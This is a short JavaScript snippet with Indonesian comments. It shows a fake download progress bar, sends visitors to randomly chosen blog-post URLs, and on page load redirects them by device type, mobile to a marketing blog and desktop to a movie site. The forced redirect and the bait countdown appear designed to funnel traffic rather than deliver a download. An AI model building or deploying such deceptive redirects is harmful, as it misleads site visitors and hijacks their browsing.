    // Mendapatkan elemen progress bar
    var progressBar = document.querySelector('.progress-bar');
    // Mendapatkan elemen tombol download
    var downloadButtonContainer = document.getElementById('button-container');

    // Membuat fungsi untuk menganimasikan progress bar
    function animateProgressBar() {
        var width = 1; // Nilai awal lebar progress bar
        var interval = setInterval(function() {
            if (width >= 100) {
                clearInterval(interval); // Menghentikan interval jika lebar sudah mencapai 100%
                downloadButtonContainer.style.display = 'block'; // Menampilkan tombol download
            } else {
                width++; // Meningkatkan nilai lebar progress bar
                progressBar.style.width = width + '%'; // Mengatur lebar progress bar
                progressBar.innerText = width + '%'; // Menampilkan angka persentase di dalam progress bar
                progressBar.setAttribute('aria-valuenow', width); // Mengatur nilai persentase untuk aksesibilitas
            }
        }, 50); // Interval animasi
    }

    // Memanggil fungsi untuk memulai animasi progress bar
    animateProgressBar();

function reloadPage() {
    // Menyimpan status reload ke sessionStorage
    sessionStorage.setItem('reloading', 'true');
    // Reload halaman
    location.reload();
}

// Memeriksa status reload saat halaman dimuat
window.onload = function() {
    var reloading = sessionStorage.getItem('reloading');
    if (reloading) {
        sessionStorage.removeItem('reloading');
        // Jika halaman sedang di-reload, lakukan aksi yang diperlukan
    }
}

function redirectToURL() {
    // Array dari URL
    var urls = [
        'https://business.faridahdecoration.com/2023/07/crm-for-home-builder-options.html?reloading=true',
        'https://business.faridahdecoration.com/2023/07/crm-marketing-service-recovery-winning.html?reloading=true',
        'https://business.faridahdecoration.com/2023/07/the-best-guide-to-finding-old-maximizer.html?reloading=true',
        'https://business.faridahdecoration.com/2023/07/understanding-power-of-email-marketing.html?reloading=true',
        'https://business.faridahdecoration.com/2023/07/maximizing-sales-and-efficiency-power.html?reloading=true',
        'https://business.faridahdecoration.com/2024/04/crm-solutions.html?reloading=true'
    ];

    // Pilih URL secara acak dari array
    var randomUrl = urls[Math.floor(Math.random() * urls.length)];

    // Arahkan ke URL acak
    window.location.href = randomUrl;
}

function reloadPage() {
    // Reload halaman dengan parameter 'reloading'
    window.location.href = window.location.href.split('?')[0] + "?reloading=true";
}

// Deteksi apakah pengguna mengakses situs melalui desktop atau mobile
function detectDevice() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'mobile' : 'desktop';
}

// Fungsi untuk melakukan pengalihan domain
function redirectDomain() {
    var device = detectDevice();
    if (device === 'mobile') {
        window.location.href = "https://business.faridahdecoration.com/";
    } else {
        window.location.href = "https://movie.bangkulon.com/";
    }
}

// Panggil fungsi untuk melakukan pengalihan saat halaman dimuat
redirectDomain();

